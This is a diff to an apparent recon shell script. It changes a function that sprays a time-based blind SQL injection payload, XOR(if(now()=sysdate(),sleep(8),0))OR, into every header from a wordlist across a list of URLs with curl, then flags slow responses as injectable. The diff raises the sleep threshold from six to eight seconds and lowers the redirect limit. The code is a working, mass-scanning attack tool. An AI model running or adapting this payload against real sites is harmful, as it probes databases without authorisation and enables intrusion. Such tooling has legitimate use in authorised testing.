@@ -302,7 +302,7 @@ subdomains(){
 	echo "$(($diff / 60))m $(($diff % 60))s elapsed." | tee -a salida.txt
 }
 
-# Gets an url with curl and adds every header to check for potential sqli injections (if response time > 6 seconds)
+# Gets an url with curl and adds every header to check for potential sqli injections (if response time > 8 seconds)
 # usage: checkheadersforsqli urllist.txt outputheaderswithsqli.txt
 # output: list of urls and headers with potential sqli
 checkheadersforsqli(){
@@ -319,10 +319,10 @@ checkheadersforsqli(){
 		regex='(https?)://[-A-Za-z0-9\+&@#/%?=~_|!:,.;]*[-A-Za-z0-9\+&@#/%=~_|]'
 		if [[ $url =~ $regex ]]; then 
 			cat ~/tools/__diccionarios/headers.txt | while read head; do
-				response=$(curl -X GET -H 'User-Agent:' -H "$head: \"XOR(if(now()=sysdate(),sleep(6),0))OR\"" -s -I -L -w "%{time_starttransfer}" --max-redirs 10 --connect-timeout 15 --max-time 15 $url)
+				response=$(curl -X GET -H 'User-Agent:' -H "$head: \"XOR(if(now()=sysdate(),sleep(8),0))OR\"" -s -I -L -w "%{time_starttransfer}" --max-redirs 3 --connect-timeout 15 --max-time 15 $url)
 				time=$(echo "$response" | tail -1 | awk -F  "." '{print $1}')
 				if [[ $time =~ '^[0-9]+$' ]]; then
-					if (($time >= 6)); then
+					if (($time >= 8)); then
 						echo "\r\n*** URL: $url - Header: $head\r\n" >> $2
 						echo "$response" >> $2
 						((i++))
